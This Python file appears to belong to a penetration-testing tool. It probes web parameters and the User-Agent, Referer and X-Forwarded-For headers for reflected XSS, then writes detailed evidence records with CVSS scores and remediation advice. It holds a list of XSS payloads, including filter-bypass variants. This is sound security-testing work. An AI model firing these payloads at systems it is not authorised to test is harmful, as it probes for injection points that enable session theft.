"""
xss_scanner.py — XSS Scanner with Full Live Evidence Capture

Cross-Site Scripting (XSS) occurs when an application includes untrusted data
in a web page without proper encoding, allowing attackers to inject client-side
scripts that execute in victims' browsers. The impact is often underestimated
by developers — a working XSS gives an attacker the same power over the page
as the legitimate JavaScript that runs there.

Three XSS variants exist:
  - Reflected XSS: payload in the request, reflected immediately in the response
  - Stored XSS: payload stored server-side, delivered to all future visitors
  - DOM-based XSS: payload processed by client-side JavaScript without server involvement

This scanner tests reflected XSS (the most common and fastest to detect),
including header-based reflection (User-Agent, Referer, X-Forwarded-For)
which is frequently overlooked.
"""

import requests
import urllib3
import time
import re
from urllib.parse import urlparse, urlencode, parse_qs
from typing import List, Dict, Optional

from utils.evidence import EvidenceRecord, HttpTransaction, capture_http

urllib3.disable_warnings()

# Payloads ordered from simple to bypass-required
XSS_PAYLOADS = [
    ("<script>alert(1)</script>",
     "Basic script tag injection — works when HTML context is unescaped"),
    ("<img src=x onerror=alert(1)>",
     "Image onerror handler — fires when browser fails to load a 1-char src"),
    ("<svg onload=alert(1)>",
     "SVG onload — inline SVG vectors bypass filters that only block <script>"),
    ('"><img src=x onerror=alert(1)>',
     "Attribute breakout — closes an attribute value then injects an element"),
    ("' onmouseover='alert(1)",
     "Single-quote attribute breakout — injects an event handler into an attribute"),
    ("<ScRiPt>alert(1)</sCrIpT>",
     "Mixed-case bypass — defeats naive case-sensitive blacklist filters"),
    ("<img src=x oNeRrOr=alert(1)>",
     "Mixed-case attribute bypass — targets attribute-level blacklists"),
]

# Headers that web applications sometimes reflect into pages without encoding
REFLECTIVE_HEADERS = {
    "X-Forwarded-For": "<script>alert(1)</script>",
    "Referer":         "<img src=x onerror=alert(1)>",
    "User-Agent":      "<svg onload=alert(1)>",
}


def _reflection_context(body: str, payload: str) -> str:
    """
    Find the exact location where the payload appears in the response body
    and return surrounding HTML context so the reader can see exactly
    how the injection manifests in the page structure.
    """
    idx = body.find(payload)
    if idx == -1:
        # Try case-insensitive
        idx = body.lower().find(payload.lower())
    if idx == -1:
        return body[:300]
    start = max(0, idx - 120)
    end   = min(len(body), idx + len(payload) + 120)
    return f"...{body[start:end]}..."


def build_session() -> requests.Session:
    s = requests.Session()
    s.verify = False
    s.headers.update({
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    })
    return s


def test_param_xss(
    base_url: str,
    param: str,
    base_params: Dict,
    session: requests.Session,
    baseline_tx: HttpTransaction,
) -> Optional[EvidenceRecord]:
    """
    Test a single GET/POST parameter for reflected XSS.

    The test strategy is: send each payload and check whether it appears
    verbatim (unescaped) in the HTML response. If it does, a browser
    rendering that page would execute our injected script.
    """
    for payload, payload_desc in XSS_PAYLOADS:
        test_p   = {**base_params, param: payload}
        test_url = f"{base_url}?{urlencode(test_p)}"

        resp, tx = capture_http(
            session, "GET", test_url,
            annotation=(
                f"Injecting XSS payload into '{param}' to test if it appears "
                f"unencoded in the HTML response body"
            ),
            timeout=10, allow_redirects=True,
        )
        time.sleep(0.2)

        if resp is None:
            continue

        # Check if payload appears unencoded in the response
        if payload in resp.text:
            context = _reflection_context(resp.text, payload)
            tx.annotation = (
                f"XSS CONFIRMED: the payload appears verbatim and unescaped in the HTML. "
                f"A browser rendering this page would execute the injected script. "
                f"See the HTML context below."
            )

            rec = EvidenceRecord()
            rec.vulnerability_class   = "Cross-Site Scripting — Reflected XSS"
            rec.attack_phase          = "Exploitation"
            rec.severity              = "HIGH"
            rec.cvss_score            = 7.4
            rec.cvss_vector           = "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N"
            rec.cwe                   = "CWE-79: Improper Neutralization of Input During Web Page Generation"
            rec.owasp                 = "OWASP Top 10 A03:2021 — Injection"

            rec.tool_name             = "Custom reflected XSS payload prober"
            rec.tool_purpose          = (
                f"We sent a series of XSS payloads into parameter '{param}' and checked "
                f"whether each payload appeared verbatim and unescaped in the HTML response. "
                f"The payload '{payload}' ({payload_desc}) was reflected without encoding, "
                f"proving a working XSS injection point."
            )
            rec.tool_why_chosen       = (
                "Reflected XSS is the most common form and the fastest to confirm. "
                "We test parameter-by-parameter because different parameters often pass "
                "through different code paths with varying levels of sanitisation. "
                f"'{param}' was selected because it appeared in the page's query string "
                "and query-string parameters are a primary XSS attack surface."
            )
            rec.tool_how_it_works     = (
                f"The server-side code receives '{param}={payload}' and incorporates "
                f"the value into the HTML page without HTML-encoding the special characters "
                f"< > \" '. When a browser loads the page, it parses these characters as HTML "
                f"rather than text, causing it to create a <script> element and execute its content. "
                f"\n\nOur payload '{payload}' was chosen because: {payload_desc}. "
                f"We worked through increasingly complex bypass payloads until we found one "
                f"that survives the application's filtering (if any)."
            )
            rec.target_url            = test_url
            rec.target_parameter      = param
            rec.target_parameter_context = (
                f"GET query-string parameter '{param}'. The value is inserted into the "
                f"HTML response without HTML-entity encoding, creating a script injection point."
            )
            rec.payload_used          = payload
            rec.payload_explanation   = (
                f"'{payload}' — {payload_desc}.\n\n"
                f"When HTML-encoded correctly, < becomes &lt; and > becomes &gt;, making "
                f"the payload appear as harmless text. When unencoded (as here), the browser "
                f"treats < and > as tag delimiters and parses our payload as executable HTML."
            )
            rec.http_transactions     = [baseline_tx, tx]
            rec.server_response_analysis = (
                f"The server returned HTTP {resp.status_code}. Our payload appears verbatim "
                f"in the response body in the following HTML context:\n\n"
                f"  {context}\n\n"
                f"The payload is not HTML-encoded: the literal characters <, >, (, ) appear "
                f"in the page source. Any browser rendering this page will execute the injected "
                f"script. Baseline response ({baseline_tx.response_length} bytes) contained no "
                f"script injection; injected response ({tx.response_length} bytes) contains our payload."
            )
            rec.root_cause            = (
                f"The application outputs the value of parameter '{param}' directly into the "
                f"HTML page without calling an HTML-encoding function on it. Most modern "
                f"templating engines (Jinja2, Handlebars, React JSX) auto-encode output by "
                f"default — this suggests either raw concatenation is used, or a deliberate "
                f"'safe' / 'raw' filter has been applied where it should not be."
            )
            rec.vulnerability_importance = (
                "XSS is critically important because it allows an attacker to execute arbitrary "
                "JavaScript in a victim's browser in the context of the trusted website. "
                "Unlike many vulnerabilities that affect the server, XSS attacks the USER — "
                "every person who visits the affected page becomes a potential victim. "
                "The injected script runs with the same trust level as the site's legitimate code: "
                "it can read cookies, access session tokens, make authenticated API requests, "
                "redirect the user, capture keystrokes, and modify page content."
            )
            rec.business_impact       = (
                f"An attacker exploiting this on {base_url.split('/')[2]} could:\n"
                f"  1. STEAL SESSION COOKIES: If the session cookie lacks the HttpOnly flag, "
                f"     JavaScript can read document.cookie and exfiltrate the token to an attacker "
                f"     server — giving the attacker full authenticated access as the victim user.\n"
                f"  2. PERFORM ACTIONS AS THE VICTIM: Make authenticated API calls on behalf of "
                f"     the logged-in user — transfer funds, change passwords, post content.\n"
                f"  3. PHISH CREDENTIALS: Inject a fake login form over the real page. "
                f"     The user sees a legitimate URL and a page they trust — they enter credentials.\n"
                f"  4. SPREAD TO OTHER USERS (if stored): If this parameter is stored and "
                f"     re-displayed, every user who views the page is attacked automatically.\n"
                f"  5. KEYLOG INPUT: Inject a script that captures every keystroke on the page.\n\n"
                f"The attack is delivered via a malicious link: an attacker shares a URL "
                f"like {test_url} and any user who clicks it is immediately compromised."
            )
            rec.real_world_scenario   = (
                "XSS attacks are extremely common in the wild. Notable incidents include: "
                "The 2014 eBay XSS attack that allowed attackers to redirect users to phishing "
                "pages using the legitimate eBay domain. The 2013 Yahoo Mail XSS that allowed "
                "mass account hijacking. The British Airways breach partly involved script "
                "injection that silently captured payment card details at checkout. "
                "The Samy worm (2005) infected over one million MySpace accounts in 20 hours "
                "using a single self-propagating XSS payload."
            )
            rec.financial_impact_estimate = (
                "XSS-driven credential theft and account takeover campaigns average $5.5M "
                "in business impact per incident (Ponemon). For e-commerce platforms, "
                "payment card skimming via XSS (Magecart-style attacks) have resulted in "
                "multi-million dollar PCI DSS fines and card replacement costs."
            )
            rec.exploitation_confirmed  = True
            rec.exploitation_evidence   = (
                f"Payload '{payload}' appears verbatim and unescaped in the HTTP response body. "
                f"HTML context of reflection: {context[:200]}"
            )
            rec.immediate_fix         = (
                f"HTML-encode all user-supplied values before inserting them into HTML output. "
                f"In Python: use html.escape(). In Jinja2: ensure auto-escaping is enabled and "
                f"remove any |safe filters from user-controlled variables. In JavaScript: never "
                f"set innerHTML to user input — use textContent instead."
            )
            rec.long_term_fix         = (
                "Implement a strict Content-Security-Policy (CSP) header that disallows "
                "inline scripts and restricts script sources to known domains. "
                "Set the HttpOnly flag on all session cookies to prevent JavaScript access. "
                "Add XSS-specific unit tests to CI/CD using payloads from this report. "
                "Use a templating engine with auto-escaping enabled by default."
            )
            rec.verification_steps    = (
                f"After patching: load {test_url} in a browser. The payload should appear "
                f"as literal text on the page (showing the angle brackets as characters), "
                f"not execute as script. No alert dialog should fire."
            )
            return rec

    return None


def test_header_xss(
    target_url: str,
    session: requests.Session,
    baseline_tx: HttpTransaction,
) -> List[EvidenceRecord]:
    """
    Test HTTP request headers for XSS reflection.

    Applications sometimes log, display, or process request headers like
    User-Agent, Referer, and X-Forwarded-For — and reflect them back into
    responses without encoding. This is commonly overlooked in manual testing.
    """
    findings = []
    for header_name, payload in REFLECTIVE_HEADERS.items():
        resp, tx = capture_http(
            session, "GET", target_url,
            annotation=f"Injecting XSS payload into {header_name} header to test server-side reflection",
            headers={header_name: payload},
            timeout=10, allow_redirects=True,
        )
        time.sleep(0.2)

        if resp is None:
            continue

        if payload in resp.text:
            context = _reflection_context(resp.text, payload)
            tx.annotation = (
                f"XSS VIA HTTP HEADER: '{header_name}' value is reflected in the response "
                f"without HTML encoding. The injected script would execute in any browser "
                f"that loads this page when the header contains the payload."
            )

            rec = EvidenceRecord()
            rec.vulnerability_class   = f"Cross-Site Scripting — Header Reflection ({header_name})"
            rec.attack_phase          = "Exploitation"
            rec.severity              = "MEDIUM"
            rec.cvss_score            = 6.1
            rec.cvss_vector           = "CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:C/C:L/I:L/A:N"
            rec.cwe                   = "CWE-79"
            rec.owasp                 = "OWASP Top 10 A03:2021 — Injection"
            rec.tool_name             = f"HTTP header XSS reflection probe"
            rec.tool_purpose          = (
                f"We injected XSS payloads into the '{header_name}' HTTP request header "
                f"and checked whether the value appears unencoded in the server's HTML response. "
                f"Header-based XSS is frequently missed because automated scanners focus on "
                f"parameters, not headers."
            )
            rec.tool_why_chosen       = (
                f"The {header_name} header is commonly logged by analytics systems and WAFs, "
                f"and sometimes displayed in admin dashboards or error pages. If an admin user "
                f"visits a log viewer while a payload is stored, that admin's browser executes "
                f"the script — potentially with elevated privileges."
            )
            rec.tool_how_it_works     = (
                f"We sent a GET request to {target_url} with the header:\n"
                f"  {header_name}: {payload}\n\n"
                f"The server processed the header and incorporated its value into the HTML "
                f"response without encoding. The payload '{payload}' appears verbatim "
                f"in the page source."
            )
            rec.target_url            = target_url
            rec.target_parameter      = f"HTTP Header: {header_name}"
            rec.payload_used          = payload
            rec.payload_explanation   = f"XSS payload injected via {header_name} header"
            rec.http_transactions     = [baseline_tx, tx]
            rec.server_response_analysis = (
                f"The '{header_name}' header value is reflected in the response:\n\n"
                f"  {context}\n\n"
                f"The payload appears unescaped, proving server-side reflection without encoding."
            )
            rec.root_cause            = (
                f"The application reads the {header_name} HTTP header value and outputs it "
                f"into the HTML page without HTML-encoding. This often occurs in analytics "
                f"dashboards, error log viewers, or admin panels that display request metadata."
            )
            rec.vulnerability_importance = (
                f"Header-based XSS is particularly dangerous in admin panels and log viewers. "
                f"If an administrator views logs containing malicious {header_name} values, "
                f"their browser executes attacker-controlled JavaScript with admin-level page access."
            )
            rec.business_impact       = (
                f"If {header_name} values are stored in logs and displayed in an admin panel, "
                f"an attacker can achieve persistent admin-context XSS: any admin who views "
                f"the logs executes the payload. This could lead to admin account takeover, "
                f"privilege escalation, or complete application compromise."
            )
            rec.real_world_scenario   = (
                "Header-based stored XSS in admin dashboards has been used to compromise "
                "e-commerce backends, extract admin credentials, and pivot to server access. "
                "It is particularly effective because it bypasses user-facing protections "
                "and targets the most privileged users of the application."
            )
            rec.financial_impact_estimate = (
                "Admin account takeover via XSS can lead to complete application compromise, "
                "equivalent in impact to a direct server breach. Average cost: $4.45M (IBM 2023)."
            )
            rec.exploitation_confirmed  = True
            rec.exploitation_evidence   = (
                f"Payload in {header_name} header reflected in response: {context[:200]}"
            )
            rec.immediate_fix         = (
                f"HTML-encode the value of {header_name} before displaying it anywhere in HTML output. "
                f"Apply output encoding consistently — assume ALL external input is hostile."
            )
            rec.long_term_fix         = (
                "Implement CSP. Never display raw request headers in HTML without encoding. "
                "Store log data separately from display logic and apply encoding at render time."
            )
            rec.verification_steps    = (
                f"Re-send request with {header_name}: {payload}. "
                f"The value should appear as escaped text (&lt;script&gt;) not executable HTML."
            )
            findings.append(rec)

    return findings


def run_xss_scanner(
    target_url: str,
    params: List[str] = None,
    progress_callback=None,
) -> List[EvidenceRecord]:
    """Main XSS scanner. Returns EvidenceRecord objects with full live evidence."""
    session = build_session()
    findings: List[EvidenceRecord] = []

    parsed = urlparse(target_url)
    url_params = list(parse_qs(parsed.query).keys())
    test_params = list(set((params or []) + url_params)) or ["q", "search", "id", "name", "msg"]
    base_url    = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
    base_params = {k: v[0] for k, v in parse_qs(parsed.query).items()}

    _, baseline_tx = capture_http(session, "GET", target_url,
        annotation="Baseline request — establishes normal page content for comparison",
        timeout=10, allow_redirects=True)

    # Header XSS
    if progress_callback:
        progress_callback(0.05, "XSS: testing HTTP header reflection")
    header_findings = test_header_xss(target_url, session, baseline_tx)
    findings.extend(header_findings)

    # Parameter XSS
    total = len(test_params)
    for i, param in enumerate(test_params):
        if progress_callback:
            progress_callback((i + 1) / total, f"XSS: testing parameter '{param}'")
        rec = test_param_xss(base_url, param, base_params, session, baseline_tx)
        if rec:
            rec.finding_id = f"XSS-{i+1:03d}"
            rec.attack_chain_position = i + 1
            findings.append(rec)
        time.sleep(0.1)

    return findings
